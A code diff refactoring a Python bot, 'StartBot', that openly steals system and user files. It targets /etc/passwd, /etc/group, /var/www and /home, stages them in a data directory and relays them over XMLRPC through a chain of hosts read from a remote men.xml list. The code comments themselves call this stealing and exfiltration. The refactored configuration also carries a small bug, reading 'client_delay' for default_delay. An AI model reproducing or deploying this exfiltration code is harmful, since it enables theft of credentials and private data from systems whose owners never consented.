@@ -8,26 +8,40 @@ from time import strftime
 from xmlrpc.server import SimpleXMLRPCServer
 from xmlrpc.server import SimpleXMLRPCRequestHandler
 from socketserver import ThreadingMixIn
+from configparser import ConfigParser
+
 class StartBot(object):
-    ##### Set global configuration parms #####
-    # How often does the XMLRPC client check
-    # for new files to forward downstream?
-    client_delay = 30
-    # How long to wait for servers to respond?
-    default_delay = 3
-    socket.setdefaulttimeout(default_delay)
-    # Where is the men.xml file available?
-    xml_url = 'http://10.0.1.221:82/men.xml'
-    # Where is men.xml data stored locally?
-    db = 'men.db'
-    # Where are incoming/outgoing files stored?
-    data_dir = 'data'
-    # What files are we after on node 0?
-    # Files in this list are priority #1
-    myfiles = ['/etc/passwd', '/etc/group']
-    # Files in the following directories (if they exist)
-    # are priority #2 and up, from left-to-right
-    mydirs = ['/var/www','/usr/lib/cgi-bin','/var/log','/home','/media']
+    def __init__(self):
+        defaults = {'client_delay': 30, 'default_delay': 3, 'xml_url': 'http://10.0.1.221:82/men.xml', 'db': 'men.db', 'data_dir': 'data', 'myfiles': ['/etc/passwd', '/etc/group'], 'mydirs': ['/var/www','/usr/lib/cgi-bin','/var/log','/home','/media']}
+        try:
+            parser = ConfigParser()
+            parser.read('settings.ini')
+            options = parser['settings']
+            self.client_delay = options.getint('client_delay', defaults['client_delay'])
+            self.default_delay = options.getint('client_delay', defaults['default_delay'])
+            self.xml_url = options.get('xml_url', defaults['xml_url'])
+            self.db = options.get('db', defaults['db'])
+            self.data_dir = options.get('data_dir', defaults['data_dir'])
+            self.myfiles = options.get('myfiles', defaults['myfiles'])
+            # Convert newline-delimited string to list if default not used
+            if type(self.myfiles) is not list:
+                self.myfiles = list(filter(None, (x.strip() for x in self.myfiles.split())))
+            # Convert newline-delimited string to list if default not used
+            self.mydirs = options.get('mydirs', defaults['mydirs'])
+            if type(self.mydirs) is not list:
+                self.mydirs = list(filter(None, (x.strip() for x in self.mydirs.split())))
+        # On error, use the defaults defined above.
+        except Exception as e:
+            print('Warning: ChatAgent object unable to read configuration from settings.ini: {}.\nConfiguration set using hard-coded defaults.'.format(repr(e)))    
+            self.client_delay = defaults['client_delay']
+            self.default_delay = defaults['default_delay']
+            self.xml_url = defaults['xml_url']
+            self.db = defaults['db']
+            self.data_dir = defaults['data_dir']
+            self.myfiles = defaults['myfiles']
+            self.mydirs = defaults['mydirs']
+        # How long to wait for servers to respond?
+        socket.setdefaulttimeout(self.default_delay)
 
     class RequestHandler(ThreadingMixIn, SimpleXMLRPCRequestHandler):
         '''A (very) simple threaded XMLRPC server that accepts file
@@ -46,9 +60,9 @@ class StartBot(object):
             # This method gives us a way to check connectivity for clients
             self.server.register_introspection_functions()
             self.server.register_function(self.server_receive_file, 'server_receive_file')
-            if not os.path.exists(StartBot.data_dir):
+            if not os.path.exists(self.data_dir):
                 try:
-                    os.makedirs(StartBot.data_dir)
+                    os.makedirs(self.data_dir)
                 except OSError as e:
                     self.logger.critical('ERROR: XMLRPC server unable to create data directory: %s', e)
                     sys.exit(1)
@@ -61,7 +75,7 @@ class StartBot(object):
         def server_receive_file(self, filename, contents):
             self.logger.info('XMLRPC server received file from upstream client %s', filename.split('_')[0].replace('-', '.'))
             self.lock.acquire()
-            with open(StartBot.data_dir + '/' + filename, "wb") as handle:
+            with open(self.data_dir + '/' + filename, "wb") as handle:
                 handle.write(contents.data)
             self.lock.release()
             return True                                                                                                                                            
@@ -128,9 +142,9 @@ class StartBot(object):
         c.close()
         # Finally, transfer the file to the data_dir for exfil
         try:
-            shutil.copyfile(file[0], StartBot.data_dir + '/' + my_ip.replace('.', '-') + file[0].replace('/','_'))
+            shutil.copyfile(file[0], self.data_dir + '/' + my_ip.replace('.', '-') + file[0].replace('/','_'))
         except Exception as e:
-            logger.warning('ERROR: Unable to copy file {}: {}'.format(file[0], repr(e)))
+            logger.warning('Unable to copy file {}: {}'.format(file[0], repr(e)))
 
     def store_file_info(self, conn, filelst):
         '''Store the data from the file list in a local SQLite3 database'''
@@ -184,10 +198,10 @@ class StartBot(object):
                     logger.info('Trying next hop: %s', proxy)
 
         for file in files:
-            if os.path.isfile(StartBot.data_dir + '/' + file):
+            if os.path.isfile(self.data_dir + '/' + file):
                 if lock != None:
                     lock.acquire()
-                with open(StartBot.data_dir + '/' + file, "rb") as handle:
+                with open(self.data_dir + '/' + file, "rb") as handle:
                     binary_data = xmlrpc.client.Binary(handle.read())
                 proxy.server_receive_file(file, binary_data)
                 if lock != None:
@@ -195,7 +209,7 @@ class StartBot(object):
         for file in files:
             if lock != None:
                 lock.acquire()
-            os.remove(StartBot.data_dir + '/' + file)
+            os.remove(self.data_dir + '/' + file)
             if lock != None:
                 lock.release()
         logger.info('Successfully forwarded my files to %s', proxy)
@@ -241,9 +255,9 @@ class StartBot(object):
         my_ip = self.get_my_IP()
         logger.info('My IP is %s', my_ip)
         # We'll use just one db connection and pass it around, as needed
-        conn = sql.connect(StartBot.db)
+        conn = sql.connect(self.db)
         # Get the tree from the men.xml file
-        tree = self.parseXML(StartBot.xml_url)
+        tree = self.parseXML(self.xml_url)
         if tree != None:
             # Create/open and then populate the men database
             self.create_men_db(conn)
@@ -283,9 +297,9 @@ class StartBot(object):
         # We also need to create and populate the database table for files to exfil
         else:
             logger.info('My sequence number is 0, so I\'m NOT creating an XMLRPC server')
-            if not os.path.exists(StartBot.data_dir):
+            if not os.path.exists(self.data_dir):
                 try:
-                    os.makedirs(StartBot.data_dir)
+                    os.makedirs(self.data_dir)
                 except OSError as e:
                     logger.critical('XMLRPC client at source unable to create data directory: %s', e)
                     sys.exit(1)
@@ -299,7 +313,7 @@ class StartBot(object):
             # This loop creates a list, along with the last-modified
             # time for each, as well as default values for their
             # priority and whether they've already been "stolen"
-            for file in StartBot.myfiles:
+            for file in self.myfiles:
                 try:
                     mtime = time.ctime(os.path.getmtime(file))
                     mtime = time.strftime('%Y-%m-%d %H:%M:%S', time.strptime(mtime, "%a %b %d %H:%M:%S %Y"))
@@ -309,7 +323,7 @@ class StartBot(object):
             # mydirs is a list of directories containing interesting
             # files to steal. They're listed in priority order, from
             # highest to lowest
-            for dir in StartBot.mydirs:
+            for dir in self.mydirs:
                 priority += 1
                 for root, dirs, files in os.walk(dir, topdown=True):
                     for name in files:
@@ -353,8 +367,8 @@ class StartBot(object):
         while True:
             try:
                 # Whew! Let's get some rest...
-                logger.info('Resting for %s seconds...', str(StartBot.client_delay))
-                time.sleep(StartBot.client_delay)
+                logger.info('Resting for %s seconds...', str(self.client_delay))
+                time.sleep(self.client_delay)
                 # Okay, now let's check on the server, if we have one...
                 # If it's not running, we're not doing any good, so we might as well exit.
                 # Later, maybe add code to restart the server if it's down...
@@ -365,7 +379,7 @@ class StartBot(object):
                 # loop iteration.
                 if my_seq_no == 0:
                     self.steal_a_file(conn, my_ip, logger)
-                files = os.listdir(StartBot.data_dir)
+                files = os.listdir(self.data_dir)
                 logger.info('Files in the data directory: %s', files)
                 # For those bots that have clients, we need to send these files to the
                 # downstream server
